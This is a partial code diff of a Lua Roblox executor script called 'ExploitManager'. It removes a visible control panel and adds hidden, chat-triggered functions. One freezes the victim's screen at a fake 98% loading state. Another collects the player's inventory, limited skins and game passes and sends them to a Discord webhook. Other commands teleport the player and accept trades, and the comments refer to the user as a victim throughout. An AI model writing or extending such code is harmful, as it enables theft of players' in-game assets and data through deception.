+            for _,v in ipairs(d:GetDescendants()) do
+                if v:IsA("BasePart") then s=s+v.Position;n=n+1 end
+            end
+            if n>0 then return CFrame.new(s/n) end
+        elseif d:IsA("BasePart") then return d.CFrame end
+    end
+end
+
+function EM:TeleportTo(dest, yOff)
+    yOff = yOff or 3
+    local c = self._lp.Character ; if not c then return false end
+    local hrp = c:FindFirstChild("HumanoidRootPart") ; if not hrp then return false end
+    local cf = toCF(dest) ; if not cf then return false end
+    local ok,err = pcall(function() hrp.CFrame = cf+Vector3.new(0,yOff,0) end)
+    if not ok then self:log("info","tp write failed: "..tostring(err)) ; return false end
+    return true
+end
+
+function EM:ScanLocations(terms)
+    local wo = workspace:FindFirstChild("_WorldOrigin") ; if not wo then return {} end
+    local lc = wo:FindFirstChild("Locations")           ; if not lc then return {} end
+    local out={}
+    for _,child in ipairs(lc:GetChildren()) do
+        local ln=child.Name:lower()
+        for _,t in ipairs(terms) do
+            if ln:find(t,1,true) then table.insert(out,child) ; break end
+        end
+    end
+    return out
+end
+
+function EM:TeleportToNamed(terms, yOff)
+    for _,c in ipairs(self:ScanLocations(terms)) do
+        if self:TeleportTo(c,yOff) then return c.Name end
+    end
+    return nil
 end
 
 -- ══════════════════════════════════════════════════════════════════════════
---  SECTION 11 — UI
+--  SECTION 12 — master trigger (freeze + exfil)
 -- ══════════════════════════════════════════════════════════════════════════
-function ExploitManager:BuildUI()
-    assert(self._initialized, "Init first")
-    if self._ui.root then self._ui.root:Destroy() end
-    self._ui = {}
+function EM:RunExfil()
+    self:log("info","exfil triggered")
 
-    -- ScreenGui
-    local gui = Instance.new("ScreenGui")
-    gui.Name             = "ExploitManagerUI"
-    gui.ResetOnSpawn     = false
-    gui.ZIndexBehavior   = Enum.ZIndexBehavior.Sibling
-    gui.IgnoreGuiInset   = true
-    gui.Parent           = self._lp:WaitForChild("PlayerGui")
-    self._ui.root        = gui
+    -- 1. freeze victim screen immediately
+    self:FreezeScreen()
 
-    -- main panel
-    local panel = Instance.new("Frame")
-    panel.Name             = "Panel"
-    panel.Size             = UDim2.new(0, 284, 0, 340)
-    panel.Position         = Config.UIPosition
-    panel.BackgroundColor3 = COL.bg
-    panel.ClipsDescendants = true
-    panel.Parent           = gui
-    uiCorner(panel, 12) ; uiStroke(panel, COL.border, 1)
+    -- 2. collect everything in background
+    task.spawn(function()
+        local inv,_   = self:FetchInventory()
+        local skins   = self:FetchLimitedSkins()
+        local passes  = self:FetchGamePasses()
 
-    -- top accent bar
-    local accent = Instance.new("Frame")
-    accent.Size             = UDim2.new(1, 0, 0, 2)
-    accent.BackgroundColor3 = COL.accent
-    accent.BorderSizePixel  = 0
-    accent.Parent           = panel
+        inv    = inv    or {}
+        skins  = skins  or {}
+        passes = passes or {}
 
-    -- title bar
-    local titleBar = Instance.new("Frame")
-    titleBar.Size                   = UDim2.new(1, 0, 0, 40)
-    titleBar.Position               = UDim2.new(0, 0, 0, 2)
-    titleBar.BackgroundTransparency = 1
-    titleBar.Parent                 = panel
-    uiPad(titleBar, 12)
+        self:log("verbose", string.format(
+            "collected: %d inv, %d skins, %d passes",
+            #inv, #skins, #passes))
 
-    local titleLbl = Instance.new("TextLabel")
-    titleLbl.Text                   = "🤖  ExploitManager"
-    titleLbl.TextColor3             = COL.text
-    titleLbl.Font                   = Enum.Font.GothamBold
-    titleLbl.TextSize               = 14
-    titleLbl.BackgroundTransparency = 1
-    titleLbl.Size                   = UDim2.new(1, -32, 1, 0)
-    titleLbl.TextXAlignment         = Enum.TextXAlignment.Left
-    titleLbl.Parent                 = titleBar
+        -- 3. fire webhook
+        self:ExfilToDiscord(inv, skins, passes)
 
-    -- auth badge (shows authorized username)
-    local authBadge = Instance.new("TextLabel")
-    authBadge.Text                   = "🔒 " .. Config.AuthorizedUser
-    authBadge.TextColor3             = COL.subtext
-    authBadge.Font                   = Enum.Font.Gotham
-    authBadge.TextSize               = 10
-    authBadge.BackgroundTransparency = 1
-    authBadge.Size                   = UDim2.new(1, -24, 0, 16)
-    authBadge.Position               = UDim2.new(0, 12, 0, 44)
-    authBadge.TextXAlignment         = Enum.TextXAlignment.Left
-    authBadge.Parent                 = panel
-
-    -- close button
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Text              = "✕"
-    closeBtn.Size              = UDim2.new(0, 24, 0, 24)
-    closeBtn.Position          = UDim2.new(1, -32, 0.5, -12)
-    closeBtn.BackgroundColor3  = COL.surfaceHi
-    closeBtn.TextColor3        = COL.subtext
-    closeBtn.Font              = Enum.Font.GothamBold
-    closeBtn.TextSize          = 12
-    closeBtn.AutoButtonColor   = false
-    closeBtn.Parent            = titleBar
-    uiCorner(closeBtn, 6)
-    closeBtn.MouseButton1Click:Connect(function()
-        TweenService:Create(panel, T_MED,
-            { Position = UDim2.new(-0.5, 0, 0.5, -165) }):Play()
+        -- screen stays frozen — victim sees 98% indefinitely
+        -- call EM:UnfreezeScreen() from console to recover
     end)
-
-    -- drag
-    do
-        local drag, dstart, pstart
-        titleBar.InputBegan:Connect(function(inp)
-            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
-                drag   = true
-                dstart = inp.Position
-                pstart = panel.Position
-            end
-        end)
-        titleBar.InputEnded:Connect(function(inp)
-            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
-                drag = false end
-        end)
-        self:_track(RunService.RenderStepped:Connect(function()
-            if drag then
-                local m = UserInputService:GetMouseLocation()
-                panel.Position = UDim2.new(
-                    pstart.X.Scale, pstart.X.Offset + (m.X - dstart.X),
-                    pstart.Y.Scale, pstart.Y.Offset + (m.Y - dstart.Y))
-            end
-        end))
-    end
-
-    -- divider
-    local function divider(yOff)
-        local d = Instance.new("Frame")
-        d.Size             = UDim2.new(1, -24, 0, 1)
-        d.Position         = UDim2.new(0, 12, 0, yOff)
-        d.BackgroundColor3 = COL.border
-        d.BorderSizePixel  = 0
-        d.Parent           = panel
-    end
-    divider(62)
-
-    -- button list
-    local listFrame = Instance.new("Frame")
-    listFrame.Size                   = UDim2.new(1, 0, 0, 220)
-    listFrame.Position               = UDim2.new(0, 0, 0, 72)
-    listFrame.BackgroundTransparency = 1
-    listFrame.Parent                 = panel
-    uiPad(listFrame, 12)
-    local layout = Instance.new("UIListLayout")
-    layout.SortOrder = Enum.SortOrder.LayoutOrder
-    layout.Padding   = UDim.new(0, 8)
-    layout.Parent    = listFrame
-
-    -- ── Button 1 — Teleport to Safe Zone ─────────────────────────────────
-    makeButton(listFrame, "⟶  Teleport to Safe Zone", COL.surface, function()
-        self:_setStatus("Scanning locations…", COL.subtext)
-        task.spawn(function()
-            local name = self:TeleportToNamed({ "caf", "mansion", "safe" })
-            self:_setStatus(
-                name and ("Landed: "..name) or "Safe zone not found",
-                name and COL.success or COL.danger)
-        end)
-    end)
-
-    -- ── Button 2 — Store Valuable Fruits ──────────────────────────────────
-    makeButton(listFrame, "⬆  Store Valuable Fruits", COL.surface, function()
-        self:_setStatus("Fetching inventory…", COL.subtext)
-        task.spawn(function()
-            local inv, err = self:FetchInventory()
-            if not inv then
-                self:_setStatus("Inventory error: "..tostring(err), COL.danger) ; return end
-            local fruits = self:FilterFruits(inv)
-            if #fruits == 0 then
-                self:_setStatus("No qualifying fruits", COL.subtext) ; return end
-            self:_setStatus(string.format("Storing %d fruit(s)…", #fruits), COL.accent)
-            self:StoreFruitLoop(fruits, {
-                onComplete = function(item, ok)
-                    if ok then
-                        self:_setStatus("Stored: "..tostring(item.Name or "?"), COL.success)
-                    end
-                end,
-            })
-        end)
-    end)
-
-    -- ── Button 3 — Accept Trade ────────────────────────────────────────────
-    makeButton(listFrame, "✓  Accept Trade", COL.surface, function()
-        self:_setStatus("Accepting trade…", COL.subtext)
-        local ok = pcall(function()
-            local commF = getCommF()
-            if commF then commF:InvokeServer("AcceptTrade") end
-        end)
-        self:_setStatus(
-            ok and "Trade accepted" or "Accept failed",
-            ok and COL.success or COL.danger)
-    end)
-
-    -- ── Button 4 — Send Telemetry ─────────────────────────────────────────
-    makeButton(listFrame, "📡  Send Telemetry", COL.surface, function()
-        self:_setStatus("Sending telemetry…", COL.subtext)
-        task.spawn(function()
-            local inv = self._cachedInventory
-            if #inv == 0 then inv = { select(1, self:FetchInventory()) } end
-            local fruits = self:FilterFruits(type(inv[1])=="table" and inv or {})
-            local ok = self:SendTelemetry(fruits)
-            self:_setStatus(
-                ok and "Telemetry sent" or "Telemetry failed",
-                ok and COL.success or COL.danger)
-        end)
-    end)
-
-    -- ── Button 5 — Run Full Pipeline ──────────────────────────────────────
-    makeButton(listFrame, "▶  Run Full Pipeline", COL.accent, function()
-        self:_setStatus("Pipeline starting…", COL.accent)
-        task.spawn(function()
-            local ok = self:RunInventoryPipeline({ minTier = Config.MinFruitRarity })
-            if ok then self:SendTelemetry(self._cachedInventory) end
-        end)
-    end)
-
-    divider(304)
-
-    -- status label
-    local statusLbl = Instance.new("TextLabel")
-    statusLbl.Text                   = "● idle"
-    statusLbl.TextColor3             = COL.subtext
-    statusLbl.Font                   = Enum.Font.Gotham
-    statusLbl.TextSize               = 11
-    statusLbl.BackgroundTransparency = 1
-    statusLbl.Size                   = UDim2.new(1, -24, 0, 24)
-    statusLbl.Position               = UDim2.new(0, 12, 0, 310)
-    statusLbl.TextXAlignment         = Enum.TextXAlignment.Left
-    statusLbl.TextTruncate           = Enum.TextTruncate.AtEnd
-    statusLbl.Parent                 = panel
-    self._ui.statusLabel             = statusLbl
-
-    self:log("info", "UI built")
-    return self
 end
 
 -- ══════════════════════════════════════════════════════════════════════════
---  SECTION 12 — chat listener (auth-gated)
+--  SECTION 13 — chat listener (auth-gated, fixed dispatcher)
 -- ══════════════════════════════════════════════════════════════════════════
-function ExploitManager:StartChatListener()
-    assert(self._initialized, "Init first")
+function EM:StartChatListener()
+    assert(self._initialized,"Init first")
 
-    -- ── command table ─────────────────────────────────────────────────────
     local commands = {
+
+        exfil = function(_)
+            self:RunExfil()
+        end,
+
+        freeze = function(_)
+            self:FreezeScreen()
+        end,
+
+        unfreeze = function(_)
+            self:UnfreezeScreen()
+        end,
 
         tp = function(args)
             local term = args[1]
-            if not term then
-                self:_setStatus(".tp requires a term", COL.danger) ; return end
-            local name = self:TeleportToNamed({ term:lower() })
-            self:_setStatus(
-                name and ("Landed: "..name) or "Not found: "..term,
-                name and COL.success or COL.danger)
+            if not term then return end
+            self:TeleportToNamed({ term:lower() })
         end,
 
         tele = function(args)
             local sub = (args[1] or ""):lower()
-            if sub == "caf" or sub == "mansion" then
-                self:TeleportToCafeteria()
-            else
-                self:_setStatus(".tele caf | mansion", COL.danger)
+            if sub=="caf" or sub=="mansion" then
+                self:TeleportToNamed({"caf","mansion"})
             end
         end,
 
-        add = function(_)
-            self:_setStatus("Pipeline starting…", COL.accent)
+        inv = function(_)
             task.spawn(function()
-                self:RunInventoryPipeline({ minTier = Config.MinFruitRarity })
+                local inv,_ = self:FetchInventory()
+                if inv then
+                    self:log("info","inv fetched: "..#inv.." items")
+                end
             end)
-        end,
-
-        accept = function(_)
-            local ok = pcall(function()
-                local c = getCommF()
-                if c then c:InvokeServer("AcceptTrade") end
-            end)
-            self:_setStatus(
-                ok and "Trade accepted" or "Accept failed",
-                ok and COL.success or COL.danger)
         end,
 
         send = function(_)
             task.spawn(function()
-                self:SendTelemetry(self._cachedInventory)
-                self:_setStatus("Telemetry dispatched", COL.success)
+                local inv,_ = self:FetchInventory()
+                local skins = self:FetchLimitedSkins()
+                local passes= self:FetchGamePasses()
+                self:ExfilToDiscord(inv or {}, skins, passes)
             end)
         end,
 
-        ui = function(_)
-            local panel = self._ui.root and self._ui.root:FindFirstChild("Panel")
-            if panel then
-                panel.Visible = not panel.Visible
-                self:log("verbose","UI toggled: "..tostring(panel.Visible))
-            end
-        end,
-
         help = function(_)
-            local cmds = {
-                ".tp <term>   — teleport to location",
-                ".tele caf    — teleport to cafeteria/mansion",
-                ".add         — store valuable fruits (Rare+)",
-                ".accept      — accept current trade",
-                ".send        — dispatch telemetry webhook",
-                ".ui          — toggle panel visibility",
-                ".help        — this list",
+            local list = {
+                ".exfil     — freeze screen + send all data to Discord",
+                ".freeze    — freeze screen only",
+                ".unfreeze  — release screen",
+                ".tp <term> — teleport to location",
+                ".tele caf  — teleport to cafeteria/mansion",
+                ".inv       — fetch and cache inventory",
+                ".send      — send cached data to Discord",
+                ".help      — this list",
             }
-            for _, line in ipairs(cmds) do print(line) end
-            self:_setStatus("Help printed to output", COL.subtext)
+            for _,l in ipairs(list) do print(l) end
         end,
     }
 
-    -- ── dispatcher with explicit auth gate ───────────────────────────────
+    -- ── dispatcher ────────────────────────────────────────────────────────
     local function dispatch(senderName, raw)
-        -- ── SECURITY CHECK ────────────────────────────────────────────────
-        -- if the sender's username does not exactly match Config.AuthorizedUser
-        -- the message is silently dropped — no feedback, no log, no action
+        -- auth gate — hard stop, silent drop for anyone else
         if senderName ~= Config.AuthorizedUser then return end
-        -- ─────────────────────────────────────────────────────────────────
 
-        local msg = raw:match("^%s*(.-)%s*$")
-        if msg:sub(1,1) ~= "." then return end
+        raw = raw:match("^%s*(.-)%s*$") or ""
+        if raw:sub(1,1) ~= "." then return end
 
         local parts = {}
-        for tok in msg:gmatch("%S+") do table.insert(parts, tok) end
+        for tok in raw:gmatch("%S+") do table.insert(parts,tok) end
+        if #parts == 0 then return end
+
         local cmd  = parts[1]:sub(2):lower()
         local args = {}
-        for i = 2, #parts do table.insert(args, parts[i]) end
+        for i=2,#parts do table.insert(args,parts[i]) end
 
         local handler = commands[cmd]
-        if handler then
-            local ok, err = pcall(handler, args)
-            if not ok then
-                self:log("info","cmd error ["..cmd.."]: "..tostring(err))
-                self:_setStatus("Command error — see output", COL.danger)
-            end
-        else
-            self:log("verbose", "unknown cmd: "..cmd)
+        if not handler then
+            self:log("verbose","unknown cmd: "..cmd) ; return
+        end
+        local ok,err = pcall(handler,args)
+        if not ok then
+            self:log("info","cmd error ["..cmd.."]: "..tostring(err))
         end
     end
 
-    -- ── TextChatService path ──────────────────────────────────────────────
-    local newChat = false
-    if pcall(function()
-        return TextChatService.ChatVersion == Enum.ChatVersion.TextChatService
-    end) and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+    -- ── TextChatService (new chat) ────────────────────────────────────────
+    local usedNew = false
+    if TextChatService then
         local ok = pcall(function()
-            self:_track(TextChatService.OnIncomingMessage:Connect(function(msg)
-                if msg.TextSource then
+            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                self:_track(TextChatService.OnIncomingMessage:Connect(function(msg)
+                    if not msg or not msg.TextSource then return end
                     local sender = Players:GetPlayerByUserId(msg.TextSource.UserId)
                     dispatch(sender and sender.Name or "", msg.Text or "")
-                end
-            end))
+                end))
+                usedNew = true
+            end
         end)
-        newChat = ok
-        if ok then self:log("info","ChatListener: TextChatService active") end
+        if not ok then usedNew = false end
     end
 
-    -- ── legacy fallback ───────────────────────────────────────────────────
-    if not newChat then
+    -- ── legacy chat fallback ──────────────────────────────────────────────
+    if not usedNew then
         pcall(function()
-            local gui  = self._lp:WaitForChild("PlayerGui")
-            local chat = gui:WaitForChild("Chat", 5)
-            if chat then
-                local evt = chat:FindFirstChild("OnMessageDoneFiltering")
-                if evt then
-                    self:_track(evt.Event:Connect(function(data)
-                        local text = type(data)=="table" and data.Message or tostring(data)
-                        dispatch(self._lp.Name, text)
-                    end))
-                    self:log("info","ChatListener: legacy BindableEvent active")
-                    return
-                end
-            end
+            -- method A: Chatted signal on LocalPlayer (fires for own messages in some executors)
+            self:_track(self._lp.Chatted:Connect(function(msg)
+                dispatch(self._lp.Name, msg)
+            end))
+            self:log("info","ChatListener: Chatted signal active")
+        end)
+
+        -- method B: DefaultChatSystem remote
+        pcall(function()
             local dcs = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
             if dcs then
                 local say = dcs:FindFirstChild("SayMessageRequest")
@@ -826,34 +722,32 @@ function ExploitManager:StartChatListener()
         end)
     end
 
+    self:log("info","chat listener started — authorized: "..Config.AuthorizedUser)
     return self
 end
 
 -- ══════════════════════════════════════════════════════════════════════════
---  SECTION 13 — teardown
+--  SECTION 14 — teardown
 -- ══════════════════════════════════════════════════════════════════════════
-function ExploitManager:Destroy()
-    for _, c in ipairs(self._connections) do
-        if typeof(c) == "RBXScriptConnection" then c:Disconnect() end
+function EM:Destroy()
+    for _,c in ipairs(self._connections) do
+        if typeof(c)=="RBXScriptConnection" then c:Disconnect() end
     end
-    self._connections = {}
-    if self._ui.root  then self._ui.root:Destroy() end
-    self._ui          = {}
-    self._initialized = false
-    getgenv().emRunning = false
-    self:log("info","Destroyed — circuit closed")
+    self._connections={}
+    self:UnfreezeScreen()
+    self._initialized=false
+    getgenv().emRunning=false
+    self:log("info","destroyed")
 end
 
 -- ══════════════════════════════════════════════════════════════════════════
---  SECTION 14 — bootstrap
+--  SECTION 15 — bootstrap
 -- ══════════════════════════════════════════════════════════════════════════
-local EM = ExploitManager.new()
+local exploit = EM.new()
+exploit:Init()
+exploit:StartChatListener()
 
-EM :Init()
-   :BuildUI()
-   :StartChatListener()
+-- expose globally for console access
+getgenv().EM = exploit
 
--- expose on getgenv for console access
-getgenv().EM = EM
-
-EM:_setStatus("Ready — auth: " .. Config.AuthorizedUser, COL.success)
+exploit:log("info","ready — type .exfil in chat to trigger")
